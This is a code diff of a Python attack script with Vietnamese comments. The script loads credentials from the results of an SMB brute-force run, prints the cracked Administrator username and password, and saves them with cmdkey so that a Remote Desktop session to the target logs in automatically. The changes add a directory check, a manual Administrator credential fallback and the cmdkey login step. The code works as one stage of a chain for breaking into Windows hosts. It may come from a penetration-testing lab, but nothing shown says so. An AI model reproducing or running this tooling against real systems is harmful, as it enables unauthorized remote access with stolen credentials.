@@ -21,17 +21,19 @@ os.makedirs(OUTPUT_DIR, exist_ok=True)
 # Tìm file credential.json mới nhất trong test_results/
 CREDENTIAL_FILE = None
 results_dir = os.path.join(BASE_DIR, "test_results")
-for folder in sorted(os.listdir(results_dir), reverse=True):
-    candidate = os.path.join(results_dir, folder, "credential.json")
-    if "smb_brute" in folder and os.path.exists(candidate):
-        CREDENTIAL_FILE = candidate
-        break
+if os.path.isdir(results_dir):
+    for folder in sorted(os.listdir(results_dir), reverse=True):
+        candidate = os.path.join(results_dir, folder, "credential.json")
+        if "smb_brute" in folder and os.path.exists(candidate):
+            CREDENTIAL_FILE = candidate
+            break
 
-# # ── Cách 2: set thủ công nếu không tìm được file ──
-# MANUAL_CREDENTIAL = {
-#     "username": "Administrator",
-#     "password": "1234567890",   # ← thay bằng password thật
-# }
+# ── Cách 2: dùng khi không tìm được file credential (hoặc smb_brute chưa
+# tìm ra mật khẩu nào) — PHẢI set thật trước khi chạy, không để trống.
+MANUAL_CREDENTIAL = {
+    "username": "Administrator",
+    "password": "",   # ← thay bằng password thật trước khi chạy
+}
 
 # ════════════════════════════════════════════════════
 # BANNER
@@ -64,10 +66,23 @@ if not found:
 print(f"[+] Username : {found['username']}")
 print(f"[+] Password : {found['password']}")
 
+if not found.get("password"):
+    print("[!] Password rỗng — RDP sẽ chỉ mở màn hình đăng nhập, không tự vào được.")
+    print("[!] Set MANUAL_CREDENTIAL['password'] thật trước khi chạy nếu muốn tự động login.")
+
 # ════════════════════════════════════════════════════
 # MỞ RDP
 # ════════════════════════════════════════════════════
 print(f"\n[*] Mở RDP vào {TARGET}:3389...")
+
+# .rdp file không mang được password dạng plaintext — mstsc chỉ tự động
+# đăng nhập nếu credential đã được lưu qua cmdkey trước đó.
+if found.get("password"):
+    subprocess.run(
+        ["cmdkey", f"/generic:TERMSRV/{TARGET}", f"/user:{found['username']}", f"/pass:{found['password']}"],
+        check=False,
+    )
+    print(f"[+] Đã lưu credential qua cmdkey cho TERMSRV/{TARGET}")
 
 rdp_file = os.path.join(OUTPUT_DIR, "connect.rdp")
 with open(rdp_file, "w") as f:
